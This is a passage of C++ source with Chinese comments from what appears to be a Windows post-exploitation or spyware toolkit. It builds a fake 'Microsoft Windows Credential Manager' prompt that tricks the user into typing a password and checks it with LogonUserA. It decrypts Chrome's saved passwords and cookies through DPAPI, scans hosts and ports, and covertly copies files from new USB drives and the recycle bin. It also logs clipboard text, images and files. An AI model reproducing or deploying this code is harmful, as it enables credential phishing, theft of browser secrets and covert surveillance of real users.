        deviceEnumerator->Release();
        defaultDevice->Release();
        CoUninitialize();
        return result;
    }

    void Volume_Joke() {
        while (1) {
            Set_MasterVolume(4);
            Set_MasterVolume();
        }
    };

    //通过登录用户的方式测试用户密码是否有效
    bool Test_User_Password(string username, string password) {
        HANDLE newToken = NULL;
        int status = LogonUserA(username.data(), NULL, password.data(), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken);
        return status;
    }

    /*弹出旧版windows身份验证框视图的验证框捕获凭据
    注意点：代码注释参考Prompt_New_WindowsAuth*/
    string Prompt_Old_WindowsAuth() {
        string username;
        string password;
        string result;

        CREDUI_INFO info = { 0 };
        info.pszCaptionText = L"Microsoft Windows 凭据管理器";
        info.pszMessageText = L"当前凭据已过期，请重新验证";
        info.hbmBanner = NULL;
        info.hwndParent = NULL;
        info.cbSize = sizeof(info);

        while (true) {
            wchar_t usernameW[255] = { 0 };
            wchar_t passwordW[255] = { 0 };
            /*对话框外观信息结构体，指定服务器名称为本地，保留参数，指定为什么需要凭据对话框(目测没用)，接收用户名，
            用户名缓冲区大小，接收密码，密码缓冲区大小，不保存复选框状态，表示将用户输入的凭据视为通用凭据*/
            DWORD status = CredUIPromptForCredentialsW(&info, L".", NULL, NULL, usernameW, 255, passwordW, 255, NULL, CREDUI_FLAGS_GENERIC_CREDENTIALS);
            if (status == ERROR_SUCCESS)
            {
                username = wchar_to_string(usernameW);
                password = wchar_to_string(passwordW);
                if (Test_User_Password(username, password))
                {
                    result += "===== 成功捕获凭据！=====\n||用户名：" + username + "||\n||密码：" + password + "||\n=========================\n\n";
                    break;
                }
                else info.pszMessageText = L"用户名/密码错误，请重新输入";
            }
            else info.pszMessageText = L"请输入有效凭据";
        }
        return result;
    }

    //弹出新版windows身份验证框视图的验证框捕获凭据
    string Prompt_New_WindowsAuth()
    {
        string username;
        string password;
        string domain;
        string result = "";

        CREDUI_INFOW info;
        //对话框标题和消息文字
        info.pszCaptionText = L"Microsoft Windows 凭据管理器";
        info.pszMessageText = L"当前凭据已过期，请重新验证";
        //父窗口句柄，NULL则指定桌面为父窗口
        info.hwndParent = NULL;
        info.hbmBanner = NULL;
        info.cbSize = sizeof(info);

        while (true) {
            LPVOID outStuff;
            ULONG outSize = 0;
            ULONG outPackage = 0;
            DWORD textlen = 255;
            wchar_t usernameW[255] = { 0 };
            wchar_t passwordW[255] = { 0 };
            wchar_t domainW[255] = L"NULL";

            /*对话框外观信息结构体，不在对话框显示错误消息，身份验证包缓冲区，填充凭据字段BLOB的指针，BLOB缓冲区大小，接收凭据BLOB的指针，
            凭据BLOB缓冲区大小，忽略保存复选框状态，表示仅应枚举参数3指定的身份验证包的传入凭据(这个选项能自动填充用户名字段)*/
            DWORD status = CredUIPromptForWindowsCredentialsW(&info, 0, &outPackage, NULL, 0, &outStuff, &outSize, NULL, CREDUIWIN_ENUMERATE_CURRENT_USER);
            if (status == ERROR_SUCCESS)
            {
                /*表示该函数将尝试解密凭据，转换身份验证缓冲区的指针，缓冲区大小，接收用户名，
                用户名缓冲区大小，接收域名称，域名称缓冲区大小，接收密码，密码缓冲区大小*/
                CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outStuff, outSize, usernameW, &textlen, domainW, &textlen, passwordW, &textlen);
                domain = wchar_to_string(domainW);
                username = wchar_to_string(usernameW);
                username = username.substr(username.find("\\") + 1);
                password = wchar_to_string(passwordW);
                if (Test_User_Password(username, password)) {
                    result += "===== 成功捕获凭据！=====\n||域名：" + domain + "||\n||用户名："
                        + wchar_to_string(usernameW) + "||\n||密码：" + password + "||\n=========================\n\n";
                    break;
                }
                //提交空密码
                else info.pszMessageText = L"用户名/密码错误，请重新输入";
            }
            //点击取消按钮
            else info.pszMessageText = L"请输入有效凭据";
        }
        return result;
    }

    //DPAPI解密
    string Decrypt_WindowsCrypt(BYTE* ciptext, int len) {
        DATA_BLOB DATAIN;
        DATA_BLOB DATAOUT;
        DATAIN.pbData = ciptext;
        DATAIN.cbData = len + 1;
        char text[1024] = "";

        int status = CryptUnprotectData(&DATAIN, NULL, NULL, NULL, NULL, NULL, &DATAOUT);
        if (!status) return "解密失败";
        for (int i = 0; i < DATAOUT.cbData; i++) text[i] = DATAOUT.pbData[i];
        text[DATAOUT.cbData] = '\0';
        return text;
    }

    //win32api获取当前进程的用户名
    string Get_Current_UserName() {
        char UserName[100];
        DWORD NameSize = sizeof(UserName);
        memset(UserName, 0, NameSize);
        GetUserNameA(UserName, &NameSize);
        return UserName;
    }

    //提取Chrome中保存的账户信息
    //指定login data所在位置，为空则默认位置
    string Get_Chrome_Password(string path = "") {
        string result = "";
        sqlite3* db;
        sqlite3_stmt* stmt;
        string dbfile;

        if (!path.compare("")) {
            string cpPath = "C:\\Users\\" + Get_Current_UserName() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            //复制到temp文件夹(不能在运行时读取)
            FILEorDIR(cpPath, "C:\\Windows\\temp\\", 1);
            dbfile = "C:\\Windows\\temp\\Login Data";
        }
        else dbfile = path;

        int status = sqlite3_open(dbfile.data(), &db);
        if (status) return "无法打开数据库";
        char sql[] = "SELECT origin_url, username_value,length(password_value), password_value FROM logins";
        status = sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
        if (status) return "SQL语句执行出错";

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            string ourl = (char*)sqlite3_column_text(stmt, 0);
            string username = (char*)sqlite3_column_text(stmt, 1);
            int passLen = sqlite3_column_int(stmt, 2);
            BYTE* password = (BYTE*)sqlite3_column_text(stmt, 3);
            result += "账户所在URL：" + ourl + "\n";
            result += "账户名：" + username + "\n";
            result += "密码：" + Decrypt_WindowsCrypt(password, passLen) + "\n\n";
        }

        sqlite3_close(db);
        return result;
    }

    //提取Chrome80以前版本的cookies
    //指定Cookies所在位置，为空则默认位置
    string Get_Old_Chrome_Cookies(string path = "") {
        string result = "";
        sqlite3* db;
        sqlite3_stmt* stmt;
        string dbfile;

        if (!path.compare("")) {
            string cpPath = "C:\\Users\\" + Get_Current_UserName() + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";
            //复制到temp文件夹(不能在运行时读取)
            FILEorDIR(cpPath, "C:\\Windows\\temp\\", 1);
            dbfile = "C:\\Windows\\temp\\Cookies";
        }
        else dbfile = path;

        int status = sqlite3_open(dbfile.data(), &db);
        if (status) return "无法打开数据库";
        char sql[] = "SELECT host_key, name, path, length(encrypted_value), encrypted_value FROM cookies";
        status = sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
        if (status) return "SQL语句执行出错";

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            string host = (char*)sqlite3_column_text(stmt, 0);
            string keyname = (char*)sqlite3_column_text(stmt, 1);
            string path = (char*)sqlite3_column_text(stmt, 2);
            int cookieLen = sqlite3_column_int(stmt, 3);
            BYTE* cookie = (BYTE*)sqlite3_column_text(stmt, 4);
            result += "站点：" + host + "\n";
            result += "key：" + keyname + "\n";
            result += "Path：" + path + "\n";
            result += "Cookie：" + Decrypt_WindowsCrypt(cookie, cookieLen) + "\n\n";
        }

        sqlite3_close(db);
        return result;
    }

    /*ping主机，成功返回alive，超时返回timeout
    指定ip地址或域名(默认127.0.0.1)，指定ping超时时间(毫秒，默认1秒)*/
    string Ping_Host(string host = "127.0.0.1", DWORD timeout = 1000)
    {
        ULONG Address;
        //打开一个可以发出ICMP的句柄
        HANDLE hIp = IcmpCreateFile();
        /*接收响应的缓冲区
        文档：缓冲区应足够大以容纳ICMP_ECHO_REPLY结构加上
        RequestSize字节的数据再加上额外8字节的ICMP错误消息大小*/
        unsigned char pReply[100];
        ICMP_ECHO_REPLY* pEchoReply = (ICMP_ECHO_REPLY*)pReply;

        //将点分文本的ip地址转换为二进制网络字节序
        inet_pton(AF_INET, host.data(), &Address);
        //发送ICMP数据包
        /*句柄，目标地址，要发送的数据，数据缓冲区大小，ip header，
        接收响应的缓冲区，接收响应的缓冲区大小,等待回复的时间(毫秒)*/
        DWORD nPackets = IcmpSendEcho(hIp, Address, NULL, NULL, NULL, pReply, 100, timeout);
        IcmpCloseHandle(hIp);
        //ICMP超时
        if (pEchoReply->Status != 0) return "timeout";
        return "alive";
    }

    /*端口扫描，指定目标ip，指定端口，
    指定超时时长(毫秒，默认1秒，可设置为小数调整单位到微秒)*/
    string Port_Scan(string target, int port, double timeout = 1000) {
        WSADATA wsaData;
        SOCKET Client;
        SOCKADDR_IN Server;
        //描述符
        fd_set confd;
        FD_ZERO(&confd);
        //时间结构体
        struct timeval conntime;
        conntime.tv_sec = 0;
        conntime.tv_usec = timeout * 1000;
        //代表非阻塞
        u_long argp = 1;

        //初始化socket，指定套接字库版本
        WSAStartup(0x0202, &wsaData);
        //创建客户端套接字      
        Client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        //创建服务端套接字
        memset(&Server, 0, sizeof(SOCKADDR_IN));
        //使用TCP/IP地址格式
        Server.sin_family = PF_INET;
        Server.sin_port = htons(port);
        inet_pton(AF_INET, target.data(), &Server.sin_addr.s_addr);
        //设置非阻塞连接
        if ((port != 25) && (port != 110)) ioctlsocket(Client, FIONBIO, &argp);
        int status = connect(Client, (struct sockaddr*)&Server, sizeof(SOCKADDR_IN));
        //将Client套接字绑定到描述符confd中
        FD_SET(Client, &confd);
        //检查套接字是否可写，可写代表连接成功
        status = select(NULL, NULL, &confd, NULL, &conntime);
        //端口25/110补丁
        if ((port == 25) || (port == 110)) {
            char buf[50];
            memset(buf, 0, 50);
            send(Client, "11", 2, 0);
            int recvLen = recv(Client, buf, 50, 0);
            if (recvLen <= 0) status = 0;
        }

        //关闭/清除套接字，释放资源  
        closesocket(Client);
        WSACleanup();
        if (status > 0) return "open";
        else return "close";
    }

    /*
    ******模式1******
    对指定范围IP进行多线程ping扫描
    ******模式2******
    对指定范围的IP进行端口扫描

    注意点：A段ip必须相同不然会出问题；此段代码出bug的话建议推倒重写
    参数解析：指定模式，指定范围，指定参数1(模式1置为""就行，模式2则接收端口范围(示例：1-1000))，
    指定接收存活性输出的缓冲区，指定ping扫描的超时时长(毫秒，默认1秒)，指定线程数，指定是否开启实时输出
    范围参数示例：1.0.0.0/8;1.1.0.0/16;192.168.1.0/24;192.168.1.0/24-192.168.2.0/24;
    192.167.0.0/16-192.168.0.0/16;192.168.1.20-192.168.2.100
    */
    string Host_Scan(int mode, string range, string args1, string& output, double TimeOut = 1000, int threads_num = 3 ,bool en_output = false) {
        int status = 0;
        ThreadArgs args;
        args.stop = false;
        args.result = "";
        args.TimeOut = TimeOut;

        int numBs, numBe, numCs, numCe, numDs, numDe;
        string segAs = text_substr(range, ".", 1);
        numBs = atoi(text_substr(range, ".", 2).data());
        numCs = atoi(text_substr(range, ".", 3).data());
        string segDs = text_substr(range, ".", 4);
        numBe = atoi(text_substr(text_substr(range, "-"), ".", 2).data());
        numCe = atoi(text_substr(text_substr(range, "-"), ".", 3).data());
        string segDe = text_substr(text_substr(range, "-"), ".", 4).data();
        if (numBs == 0) { numBs = 1; numBe = 254; }
        if (numCs == 0) { numCs = 1; numCe = 254; }
        if (segDs[0] == '0') numDs = 1; else numDs = atoi(segDs.data());
        if (segDe[0] == '0') numDe = 254; else numDe = atoi(segDe.data());

        //检测数据格式是否正确
        if ((numBs <= 0) || (numBs >= 255)) status = 1;
        if ((numBe <= 0) || (numBe >= 255)) status = 1;
        if ((numCs <= 0) || (numCs >= 255)) status = 1;
        if ((numCe <= 0) || (numCe >= 255)) status = 1;
        if ((numDs <= 0) || (numDs >= 255)) status = 1;
        if ((numDe <= 0) || (numDe >= 255)) status = 1;
        if (status) return "请正确输入ip范围";

        for (int b = numBs; b < numBe + 1; b++) {
            int c = 1;
            int maxc = 254;
            if (b == numBs) c = numCs;
            if (b == numBe) maxc = numCe;
            for (; c < maxc + 1; c++) {
                int d = 1;
                int maxd = 254;
                if (c == numCs) d = numDs;
                if (c == numCe) maxd = numDe;
                for (; d < maxd + 1; d++) {
                    string ip = segAs + "." + to_string(b) + "." +
                        to_string(c) + "." + to_string(d);
                    args.IPlist.push(ip);
                }
            }
        }
        //选择模式
        if (mode == 1) {
            for (int t = 0; t < threads_num; t++) {
                thread ScanThread(ICMPthread, (void*)&args);
                ScanThread.detach();
            }
        }
        else if (mode == 2) {
            args.StartPort = atoi(text_substr(args1, "-", 1).data());
            args.EndPort = atoi(text_substr(args1, "-").data());
            for (int t = 0; t < threads_num; t++) {
                thread ScanThread(PORTthread, (void*)&args);
                ScanThread.detach();
            }
        }


        //等待线程函数传出stop消息才释放
        while (!args.stop) {
            args.mtx.lock();
            //每秒实时输出结果
            if (args.result.compare("")) {
                if (en_output) cout << args.result;
                output += args.result;
                args.result = "";
            }
            args.mtx.unlock();
            Sleep(1000);
        };
        //防止部分线程传出stop消息，部分线程还没执行完成，从而过早结束主线程
        Sleep(TimeOut * 2);
        Sleep(2000);
        //获取程序最后阶段的数据
        if (en_output) cout << args.result;
        output += args.result;

        return "扫描完成";
    }

    //枚举存在的盘符
    void Enum_Drive(vector<string>& drive_list) {
        //由于盘符可自定义，要枚举所有可能
        string alphabets = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        for (int i = 0; i < 26; i++) {
            string path(1, alphabets[i]);
            path += ":\\";
            if (!FILEorDIR(path).compare("dir")) {
                drive_list.push_back(path);
            }
        }
    }

    /*
    持续监测新增的盘符（U盘/移动硬盘/读卡器等）
    细节：可以通过预定义的文件列表在新磁盘重新插入时
    枚举是否存在文件并进行备份，检索到新磁盘将进行tree命令

    指定要进行备份的文件列表(vector容器，必须指定一个)，
    指定是否要进行备份(默认为false不会使用参数中的容器)，
    指定录制时长(分钟，默认24小时)，指定检测间隔时间(秒，默认1)，
    指定备份目录(默认当前目录，格式dir1\\)，
    指定日志名(默认为SFDrive.log)，
    指定tree输出文件名(默认为SFtree.log)
    */
    void Monitor_New_Drive
    (vector<string>& BakFiles, bool bak = false, int TimeLen = 1440, int SleepTime = 1,
        string BakDir = "", string logfile = "SFDrive.log", string treefile = "SFtree.log")
    {
        clock_t dopen = clock();
        vector<string> drives;
        Enum_Drive(drives);

        //如果有同名日志先备份
        write_file(logfile, "", 1);
        write_file(logfile, "[ " + Get_Current_Timestamp() + " ]\n现有盘符：\n");
        for (int i = 0; i < drives.size(); i++) {
            write_file(logfile, drives[i] + "\n");
        }

        while (true) {
            vector<string> tmp;
            Enum_Drive(tmp);

            for (int i = 0; i < tmp.size(); i++) {
                if (find(drives.begin(), drives.end(), tmp[i]) == drives.end())
                {
                    write_file(logfile, "\n[ " + Get_Current_Timestamp() + " ]\n");
                    write_file(logfile, "新增盘符 " + tmp[i] + "\n");
                    //保存文件
                    if (bak) {
                        for (int f = 0; f < BakFiles.size(); f++) {
                            string path = tmp[i] + BakFiles[f];
                            FILEorDIR(path, BakDir, 1);
                        }
                    }
                    string cmd = "tree /F " + tmp[i] + " > " + treefile;
                    system(cmd.data());
                }
            }
            int dtime = (double(clock() - dopen) / CLOCKS_PER_SEC) * 1000;
            if ((dtime > (TimeLen * 60000)) && TimeLen) break;
            drives = tmp;
            Sleep(SleepTime * 1000);
        }
    }

    /*
    检索回收站中真实文件名对应的删除前文件路径
    如果需要所有结果放入map容器中需要将RealName置为空
    单次搜索不存储适用于方式1，持续搜索建议存储在map
    注意：该函数中的很多方法已弃用
    */
    string Get_RecycleBin_RealName(string RealName, map<string, string>& NameMap)
    {
        char FilePath[MAX_PATH];
        STRRET fileInfo;
        ULONG uFetched;
        string result = "";
        //IShellFolder接口 , 提供了有关 Shell 文件夹内容的各种信息
        IShellFolder* isf1Rec = NULL;
        IShellFolder2* isf2p = NULL;
        //对象遍历接口
        IEnumIDList* peidl = NULL;
        LPITEMIDLIST pidlRec = NULL;
        LPITEMIDLIST pidlCur = NULL;


        //获取桌面文件夹接口,该文件夹是Shell命名空间的根
        SHGetDesktopFolder(&isf1Rec);
        //分配内存
        LPMALLOC pMalloc = NULL;
        SHGetMalloc(&pMalloc);
        /*标识回收站文件夹位置，获取指向项目标识符列表结构指针
        该结构指定文件夹相对于命名空间根目录（桌面）的位置*/
        SHGetFolderLocation(NULL, CSIDL_BITBUCKET, NULL, 0, &pidlRec);
        //绑定回收站文件夹对象，获取所请求接口指针
        isf1Rec->BindToObject(pidlRec, NULL, IID_IShellFolder, (void**)&isf2p);
        /*创建项目标识符枚举回收站中的对象(枚举文件夹项目|非文件夹项目|隐藏项目|隐藏的系统项目)，
        获取IEnumlDList接口指针来确定文件夹内容*/
        isf2p->EnumObjects(NULL, SHCONTF_FOLDERS | SHCONTF_NONFOLDERS |
            SHCONTF_INCLUDEHIDDEN | SHCONTF_INCLUDESUPERHIDDEN, &peidl);

        while (true)
        {
            //遍历IEnumIDList对象,每次递增1，直到出错
            if (peidl->Next(1, &pidlCur, &uFetched) == S_FALSE) break;
            /*将项目标识符列表(pidl)转换为文件系统路径
            (相对于命名空间根目录（桌面）的文件或目录位置)*/
            SHGetPathFromIDListA(pidlCur, FilePath);
            string FileName = text_substr(FilePath, "\\");
            if (!RealName.compare("")) {
                //获取删除前路径(检索指定文件对象或子文件夹的显示名称)
                isf2p->GetDisplayNameOf(pidlCur, SHGDN_NORMAL, &fileInfo);
                result = wchar_to_string(fileInfo.pOleStr);
                NameMap[FileName] = result;
                pMalloc->Free(fileInfo.pOleStr);
            }
            if (!RealName.compare(FileName.data())) {
                //获取删除前路径(检索指定文件对象或子文件夹的显示名称)
                isf2p->GetDisplayNameOf(pidlCur, SHGDN_NORMAL, &fileInfo);
                result = wchar_to_string(fileInfo.pOleStr);
                pMalloc->Free(fileInfo.pOleStr);
            }
        }
        // 释放资源
        pMalloc->Free(pidlRec);
        pMalloc->Release();
        peidl->Release();
        isf2p->Release();
        return result;
    }

    //获取用户的SID，默认使用当前用户，也可以指定用户名(不分大小写/支持中文)
    string Get_User_SID(const char* OtherUser = "") {
        DWORD MAX_SIZE = 100;
        char UserName[100];
        PSID* CurSid[100];
        char DomainBuf[100];
        char* SidText = NULL;
        string result = "";
        SID_NAME_USE type = SidTypeUser;

        if (!strcmp(OtherUser, "")) {
            //获取当前进程所属用户名
            DWORD NameSize = sizeof(UserName);
            memset(UserName, 0, NameSize);
            GetUserNameA(UserName, &NameSize);
        }
        else strcpy_s(UserName, 100, OtherUser);

        //根据用户名获取SID结构体
        LookupAccountNameA(NULL, UserName, CurSid,
            &MAX_SIZE, DomainBuf, &MAX_SIZE, &type);
        //将SID结构体转换为SID字符串
        ConvertSidToStringSidA(CurSid, &SidText);
        result = SidText;
        //释放资源
        LocalFree((HLOCAL)SidText);
        return result;
    }

    /*
    持续监测当前用户桌面所在盘符下的回收站
    指定录制时长(分钟，默认24小时)，指定检测间隔时间(秒，默认1)，
    指定备份目录(默认当前目录，格式dir1\\)，
    指定日志名(默认为SFRecycleBin.log)
    */
    void Monitor_Recycle_Bin
    (int TimeLen = 1440, int SleepTime = 1, string BakDir = "", string logfile = "SFRecycleBin.log")
    {
        vector<string> file_list;
        vector<string> drive_list;
        Enum_Drive(drive_list);
        clock_t RBopen = clock();

        //键值对方式存储回收站实际文件名->原路径，大幅优化内存
        map<string, string> NameMap;
        Get_RecycleBin_RealName("", NameMap);

        wchar_t DeskPath[255];
        //获取当前用户的桌面路径
        SHGetSpecialFolderPath(0, DeskPath, CSIDL_DESKTOPDIRECTORY, 0);
        //指定当前用户桌面所在盘符的回收站路径
        string DeskDrive = text_substr(wchar_to_string(DeskPath), "\\", 1) + "\\";
        string RB_path = DeskDrive + "\$RECYCLE.BIN\\" + Get_User_SID() + "\\";

        //获取当前回收站所有文件的原路径并记录，存在同名日志先备份
        List_Dir_File(RB_path, file_list);
        write_file(logfile, "", 1);
        write_file(logfile, "回收站原文件列表：\n");
        for (int i = 0; i < file_list.size(); i++) if (file_list[i][1] == 'R')
            write_file(logfile, NameMap[file_list[i]] + "\n");

        //列出桌面所在磁盘以外的所有磁盘回收站
        for (int x = 0; x < drive_list.size(); x++) {
            vector<string> OthRB_files;
            string drive_RBpath = drive_list[x] + "\$RECYCLE.BIN\\" + Get_User_SID() + "\\";
            //主要为了排除磁盘为U盘的情况
            if (FILEorDIR(drive_RBpath).compare("error")) {
                List_Dir_File(drive_RBpath, OthRB_files);
                write_file(logfile, "\n\n\n盘符" + drive_list[x] + "的回收站文件：\n");
                for (int y = 0; y < OthRB_files.size(); y++) write_file(logfile, OthRB_files[y] + "\n");
            }
        }


        while (true) {
            vector<string> tmp;
            List_Dir_File(RB_path, tmp);
            for (int i = 0; i < tmp.size(); i++) {
                /*查询程序开始时文件列表中没有的元素
                并筛选出"$R\w"的原始文件(排除"$I\w"的文件信息文件)*/
                if ((find(file_list.begin(), file_list.end(), tmp[i])
                    == file_list.end()) & (tmp[i][1] == 'R')) {
                    //监测到文件变化才会重新获取键值对
                    Get_RecycleBin_RealName("", NameMap);
                    write_file(logfile, "\n[ " + Get_Current_Timestamp() + " ]\n");
                    write_file(logfile, "回收站文件名： " + tmp[i] + "\n");
                    write_file(logfile, "原路径：" + NameMap[tmp[i]] + "\n");
                    FILEorDIR(RB_path + tmp[i], BakDir, 1);
                }
            }
            int RBtime = (double(clock() - RBopen) / CLOCKS_PER_SEC) * 1000;
            if ((RBtime > (TimeLen * 60000)) && TimeLen) break;
            file_list = tmp;
            Sleep(SleepTime * 1000);
        }
    }

    //剪贴板监控，指定日志文件名，指定录制时长(分钟，默认30分钟), 指定检测剪贴板的间隔时间(毫秒，默认5秒)
    void clip_monitor(string logfile, int TimeLen = 30, int SleepTime = 5000, size_t maxSize = 102400) {
        string log;
        //文本类型缓存
        string text_tmp;
        //图像类型缓存
        HBITMAP bmp_tmp;
        //文件类型缓存
        vector<string> path_tmp;
        //程序开始的时间
        clock_t kopen = clock();
        //如果存在同名日志先进行备份
        write_file(logfile, "", 1);
        while (true) {
            bool rep = true;

            //时间戳，用于记录日志
            SYSTEMTIME lt;
            GetLocalTime(&lt);
            string Time = Get_Current_Timestamp();

            //如果剪贴板内容为文本则进行读取
            if (IsClipboardFormatAvailable(CF_TEXT)) {
                string text = GetClipText(text_tmp);
                if (text.compare("")) {
                    log = "\n" + Time + "\n[text]\n" + text + "\n";
                    write_file(logfile, log, 0);
                }
            }
            //位图类型
            else if (IsClipboardFormatAvailable(CF_BITMAP)) {
                string bmpName;
                for (int i = 1; i <= 10000; i++) {
                    bmpName = to_string(i) + ".bmp";
                    if (!FILEorDIR(bmpName).compare("error")) {
                        GetClipBitmap(bmp_tmp, bmpName, rep);
                        break;
                    }
                }
                if (!rep) {
                    log = "\n" + Time + "\n" + "[Image] " + bmpName + "\n";
                    write_file(logfile, log, 0);
                }
            }
            //文件类型
            else if (IsClipboardFormatAvailable(CF_HDROP)) {
                vector<string> flist = GetClipPaths(path_tmp, rep, maxSize);
                if (!rep) {
                    log = "\n" + Time + "\n[File] ";
                    for (int i = 0; i < flist.size(); i++) log += flist.at(i) + "\n";
                    write_file(logfile, log, 0);
                }
            }
            //判断是否达到的录制时长
            clock_t kclose = clock();
            int ktime = (double(kclose - kopen) / CLOCKS_PER_SEC) * 1000;
            if (ktime > (TimeLen * 60000)) break;

            //减少不必要的循环
            Sleep(SleepTime);
        }
    }

    string GetClipText(string& tmp) {
        //访问剪贴板
        OpenClipboard(NULL);
        //获取剪切板数据
        HANDLE text = GetClipboardData(CF_TEXT);
        //从全局内存检索数据
        char* buf = (char*)GlobalLock(text);
        GlobalUnlock(text);
        //关闭剪贴板
        CloseClipboard();
        //缓存，判断是否重复
        if (!tmp.compare(buf)) {
            return "";
        }
        tmp = buf;
        return buf;
    }

    //获取剪贴板图像并保存，指定缓存用于判断重复，bmp文件名，是否为重复结果
    void GetClipBitmap(HBITMAP& tmp, string bmpName, bool& rep) {
        //访问剪贴板
        OpenClipboard(NULL);
        HBITMAP bmp = (HBITMAP)GetClipboardData(CF_BITMAP);
        //判断是否重复，如果重复复制同一张图会重复记录
        if (tmp != bmp) {
            BITMAPV5HEADER* header = (BITMAPV5HEADER*)GetClipboardData(CF_DIBV5);
            int Width = header->bV5Width;
            int Height = header->bV5Height;
            SaveBmp(bmp, Width, Height, NULL, bmpName.data());
            GlobalUnlock(bmp);

            tmp = bmp;
            rep = false;
        }
        //关闭剪贴板
        CloseClipboard();
    }

    bool SaveBmp(HBITMAP& hBmp, int Width, int Height, HDC hdc = NULL, const char* szSavePath = "save.bmp")
    {
        //创建一个兼容的DC,在内存中表示当前位图的上下文
        HDC hCmpDC = CreateCompatibleDC(hdc);
        //宽高
        int iScreenWidth = Width;
        int iScreenHeight = Height;

        //用当前位图句柄表示内存中屏幕位图上下文，选择一个对象到指定的DC上
        SelectObject(hCmpDC, hBmp);

        //将当前屏幕图像复制到内存中
        BOOL ret = BitBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hdc, 0, 0, SRCCOPY);

        //BMP图像信息头
        BITMAPINFOHEADER hBmpInfo;
        //大小
        hBmpInfo.biSize = sizeof(BITMAPINFOHEADER);
        //宽高
        hBmpInfo.biWidth = iScreenWidth;
        hBmpInfo.biHeight = iScreenHeight;
        //为目标设备说明位面数，其值将总是被设为1
        hBmpInfo.biPlanes = 1;
        //使用彩色表中的颜色索引数，0代表使用所有
        hBmpInfo.biClrUsed = 0;
        //说明比特数/像素
        hBmpInfo.biBitCount = 16;
        //说明图像大小，使用BI_RGB格式时可以设置为0
        hBmpInfo.biSizeImage = 0;
        //说明图象数据压缩的类型,BI_RGB代表没有压缩
        hBmpInfo.biCompression = BI_RGB;
        //说明对图象显示有重要影响的颜色索引的数目，如果是0，表示都重要
        hBmpInfo.biClrImportant = 0;
        //分辨率，使用BI_RGB格式时可以设置为0
        hBmpInfo.biXPelsPerMeter = 0;
        hBmpInfo.biYPelsPerMeter = 0;

        //数据源大小
        DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;

        //截图总大小
        DWORD dwPicSize = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER) + dwSrcSize;

        //BMP图像文件头
        BITMAPFILEHEADER hBmpFile;
        hBmpFile.bfSize = dwPicSize;
        //bmp文件头
        hBmpFile.bfType = 0x4D42;
        hBmpFile.bfOffBits = sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER);
        hBmpFile.bfReserved1 = 0;
        hBmpFile.bfReserved2 = 0;

        //BMP图像数据源
        char* bmpSrc = new char[dwSrcSize];
        //初始化，用0来填充一块内存区域
        ZeroMemory(bmpSrc, dwSrcSize);

        //检索指定的兼容位图中的所有位元数据
        //并复制到指定格式的设备无关位图的缓存中
        GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);

        //汇总所有数据信息
        char* szBmp = new char[dwPicSize];
        ZeroMemory(szBmp, dwPicSize);
        memcpy(szBmp, (void*)&hBmpFile, sizeof(BITMAPFILEHEADER));
        memcpy(szBmp + sizeof(BITMAPFILEHEADER), (void*)&hBmpInfo, sizeof(BITMAPINFOHEADER));
        memcpy(szBmp + sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER), bmpSrc, dwSrcSize);


        //保存BMP图像
        FILE* file = NULL;
        fopen_s(&file, szSavePath, "wb+");
        if (nullptr != file)
        {
            size_t count = fwrite(szBmp, 1, dwPicSize, file);
            fclose(file);
        }

        //释放资源
        ReleaseDC(NULL, hCmpDC);
        ReleaseDC(NULL, hdc);
        delete[] szBmp;
        delete[] bmpSrc;
        return true;
    }

    //获取剪贴板中的文件路径并备份，指定缓存，结果是否重复，指定备份文件大小阈值(kb，默认102400(100M))
    vector<string> GetClipPaths(vector<string>& tmp, bool& rep, size_t maxSize = 102400)
    {
        std::vector<std::string> path_list;
        // 打开剪切板
        OpenClipboard(NULL);
        // 获取剪切板中复制的文件列表相关句柄
        HDROP hDrop = HDROP(GetClipboardData(CF_HDROP));

        if (hDrop != NULL)
        {
            //文件名
            WCHAR FilePath[MAX_PATH + 1] = { 0 };
            //获取文件个数；第二个选项为文件索引编号，如果值为0xFFFFFFFF则返回拖动到窗体的文件个数
            UINT FileCount = DragQueryFile(hDrop, 0xFFFFFFFF, NULL, 0);

            //可能同时选中了多个对象(既包含文件也包含文件夹)，所以要循环处理
            for (UINT i = 0; i < FileCount; ++i)
            {
                memset(FilePath, 0, MAX_PATH + 1);
                //第二个选项为文件索引编号，如果值为0到拖动文件总数之间则返回文件名
                DragQueryFile(hDrop, i, FilePath, MAX_PATH);
                _bstr_t path(FilePath);
                string f = (LPCSTR)path;
                path_list.push_back(f);
            }
            if (tmp != path_list) {
                string DirName;
                //创建不重名的空文件夹存储文件
                for (int i = 1; i <= 10000; i++) {
                    DirName = "dir" + to_string(i);
                    if (!FILEorDIR(DirName).compare("error")) {
                        CreateDirectory((CString)DirName.data(), NULL);
                        break;
                    }
                }
                for (int i = 0; i < path_list.size(); i++) {
                    string f = path_list.at(i);
                    fstream file(f, ios::in | ios::binary);
                    //将指针拖到末尾，并返回读取位置
                    file.seekg(0, ios::end);
                    size_t size = file.tellg() / 1024;
                    file.close();
                    //判断大小，避免复制过大文件占用大量资源
                    if (size <= maxSize) FILEorDIR(f, DirName + "\\", 1);
                }
                //将这次的结果放入缓存，用于判断是否重复
                tmp = path_list;
                rep = false;
            }
        }
        CloseClipboard();
        return path_list;
    }

    //剪贴板文本单次读取
    string GetClipLine() {
        if (IsClipboardFormatAvailable(CF_TEXT)) {
            string buf;
            GetClipText(buf);
            return buf;
        }
        return "";
    }

    //禁用键鼠，指定模式(1禁用键盘/2鼠标)，指定录制时长(单位秒,默认0,无限)
